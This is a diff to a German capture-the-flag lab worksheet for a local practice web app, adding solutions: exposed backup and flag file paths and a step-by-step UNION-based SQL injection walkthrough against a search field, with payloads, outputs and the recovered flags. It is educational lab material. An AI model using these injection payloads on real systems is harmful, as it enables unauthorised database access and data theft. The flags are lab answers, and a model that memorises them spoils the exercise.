@@ -57,8 +57,11 @@ HTML response gibt auch Hinweis wenn Benutername korrekt ist aber Passwort falsc
 - Scanne `http://localhost:3000`
 - Prüfe alle gefundenen Pfade und Dateien
 - Suche nach öffentlich erreichbaren Backup-Dateien
+    - Erreichbar [Users.json Backup Datein](http://localhost:3000/backup/users.json)
+    - [Debug Error Page](http://localhost:3000/debug/error)
 - Dokumentiere die gefundene Benutzerdatei und ihren Inhalt
 - Dokumentiere die Flag aus der Flag-Datei
+    - [FLAG{USER_DATEI_GEFUNDEN}](http://localhost:3000/backup/flag.txt)
 
 > **Hinweis:** Prüfe auch die `robots.txt` – sie kann Hinweise auf versteckte Pfade enthalten.
 
@@ -72,6 +75,56 @@ HTML response gibt auch Hinweis wenn Benutername korrekt ist aber Passwort falsc
 - Finde heraus, welche Tabellen in der Datenbank vorhanden sind
 - Lies den Inhalt der `flags`-Tabelle aus
 - Dokumentiere Vorgehen und gefundene Flag
+
+
+#### Vorgehen
+- Vorgehen ist im [SQL-Injection-Blackbox-Guide](./SQL_INJECTION_BLACKBOX_GUIDE.md)
+
+**Input Suchfeld**
+```
+'--
+```
+**Output**
+Alle Tabellen --> Man weiss nun SQL injection gehen und es ist eine SQLite/MySQL DB (Kommentar Stil)
+
+**Input Suchfeld**
+```
+' ORDER BY 6 --
+```
+**Output**
+⚠ Fehler: SQL Fehler: SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 5 --> man weiss nun dass es 5 Spalten sind
+
+
+**Input Suchfeld**
+Marker in jeden Slot setzen, um zu sehen, welche ausgegeben werden:
+```
+' UNION SELECT 'a','b','c','d','e' --
+```
+**Output**
+
+
+**Input Suchfeld**
+```
+' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL --
+```
+**Output**
+Man weiss nun die engine version 3.44.2
+
+**Input Suchfeld**
+```
+' UNION SELECT name,sql,NULL,NULL,NULL FROM sqlite_master WHERE type='table' --
+```
+**Output**
+Zeigt alle Tabellen der DB.
+
+**Input Suchfeld**
+Nach Daten aus Flag Tabelle suchen
+```
+' UNION SELECT name,value,NULL,NULL,NULL FROM flags --
+```
+**Output**
+🆕 FLAG{SQL_INJECTION_ERFOLGREICH} gefunden
+
 
 > **Wichtig:** Nur SELECT-basierte Abfragen verwenden. Keine DROP, DELETE oder UPDATE Statements.
 
